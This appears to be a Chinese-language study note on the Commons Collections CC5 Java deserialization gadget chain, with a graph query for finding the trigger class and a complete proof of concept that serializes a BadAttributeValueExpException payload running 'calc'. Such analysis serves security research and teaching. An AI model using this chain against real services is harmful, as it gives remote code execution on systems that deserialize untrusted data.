一，链条总览

 BadAttributeValueExpException  .readObject()

-> BadAttributeValueExpException  .val.toString()

->val.toString()

->TiedMapEntry.toString()

->TiedMapEntry.getValue()

->map.get(key)

->LazyMap.get()

->ChainedTransformer.transform

->.....

->命令执行

二，分析调用

在 cc6 中利用 TiedMapEntry 类在进行反序列化时会调用 hashcode 方法堆 key 进行重新排序时触发的 getKey 方法导致链条执行，而 TiedMapEntry 中还有一个方法也可以调用 getKey

<!-- 这是一张图片，ocr 内容为：PUBLIC INT HASHCODE() { OBJECT VALUE - GETVALUE(); RETURN (GETKEY() -- NULL ? 0 : GETKEY().HASHCODE()) UE - NULL ? 0 : VALUE.HASHCODE()); (VALUE GETS A STRING VERSION OF THE ENTRY. 返回值:ENTRY AS A STRING PUBLIC STRING TOSTRING(){ RETURN GETKEY() GETVALUE( 子 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783861212004-b48212de-0122-413c-a028-67526ac7271f.png)

可以看到类中还有一个 toString 方法，同样会调用 getKey 方法，那我们只需要找到一个类能在反序列化时自动触发 toString 方法，并且方法的属性可控，那我们就可以构造一条新的链子



这里我使用 tabby 工具来查找，用下列查询语句简单的找一下在 readObject 方法中调用了 toString 方法类，看能不能找到网上 cc5 利用的类：

MATCH path=(m:Method)-[:CALL]->(t:Method)

WHERE m.NAME="readObject"

AND t.NAME="toString"

RETURN path

LIMIT 100

<!-- 这是一张图片，ocr 内容为：(NEG4)$ MATCH PATHE(M:NETHOD)-{:CALLI-(T:METHOD) WHERE M.NANEE"READOBJECT" AND T.NAMEA"TOSTRING" RI口 B RAW原始 GRAPH图 TABLE表 NODE DETAILS 节点详情 READOBJ- ECT METHOD 方法 READOBJ- READOBJ- ECT VALUE 值 KEY  键 CALL 4:329740F1-7B75-40A6-AD73-9 <ID> 277B0A2CEE0:17228 READOBJ- ECT "JAVAXMANAGEMENT.BADATTRIBU CLASSNAME READOBJ- CALL ECT TEVALUEEXPEXCEPTION" CALL "JAVAX.MANAGEMENT.BADATTRIBU TOSTRING TEVALUEEXPEXCEPTION* CALL CALL READOBJ- ID "1BD0C9A2D3CE02B10FDBE7FDB ECT READOBJ- 6882D57 ECT CALL "1BD0C9A2D3CE02B10FDBE7FDB 6882D57" READOBJ- "FALSE"错误" IS_ABSTRACT READOBJ- ECT ECT READOBI- "FALSE""错误" IS GETTER ECT "FALSE"错误" IS_PUBLIC是否 为公士届性 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783862273080-c80dda5a-810a-46ec-b22e-58b5d713e150.png)

可以看到的确找到了 BadAttributeValueException 这个类

三，分析

<!-- 这是一张图片，ocr 内容为：PUBLIC STRING TOSTRING() 1 RET RETURN PRIVATE VOID READOBJECT(OBJECTINPUTSTREAM OIS) THROWS IOEXCEPTION, CLASSNOTFOUNDEXCEPTION OBJECTINPUTSTREAM.GETFIELD GF - OIS.READFIELDS(); OBJECT VALOBJ - GF.GET( NAME:"VAL", VAL:NULL); IF (VALOBJ -- NULL) { VAL - NULL; } ELSE IF (VALOBJ INSTANCEOF STRING) { VAL - VALOBJ; ELSE IF (SYSTEM.GETSECURITYMANAGER() -- NULL VALOBJ INSTANCEOF LONG VALOBJ INSTANCEOF INTEGER VALOBJ FLOAT INSTANCEOF VALOBJ INSTANCEOF DOUBLE VALOBJ INSTANCEOF BYTE VALOBJ INSTANCEOF SHORT } VALOBJ INSTANCEOF BOOLEAN) VAL - VALOBJ.TOSTRING(); ) ELSE (// THE SERIALIZED OBJECT IS FROM A VERSION WITHOUT JDK-801929292 FIX VAL - SYSTEM.IDENTITYHASHCODE(VALOBJ) +"@" + VALOBJ.GETCLASS().GETNAME(); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1783862628066-7c4e1718-c133-4eba-bec4-dbe5c75a68bb.png)

简单看一下这个类，在 反序列化时调用了 valObj.toString	，而这个 val 属性恰巧是我们能在构造是控制的输入，且在大多时候时 getSucurityManager 关闭，满足判断语句，调用 valObj.toString(）也就调用 TiedMapEntry.toString()



```java
public class App {
    public static void main(String[] args) throws Exception {
        Transformer[] evilChain = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                ),
        };
        ChainedTransformer chained = new ChainedTransformer(evilChain);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chained);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(bad, tiedMapEntry);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc5-ser"));
        oos.writeObject(bad);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc5-ser"));
        ois.readObject();
        ois.close();
    }
}
```

直接给出代码，整体利用流程和 cc6 十分类似

值得注意一点的是在 BadAtrributeValueExpException 这个类的构造方法时需要传 null

BadAttributeValueExpException bad = new BadAttributeValueExpException(null);

因为构造函数开始就会检测 val 是否为空，不为空的话就会调用 toString 方法提前触发来链子并导致后续链子不可利用

```plain
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

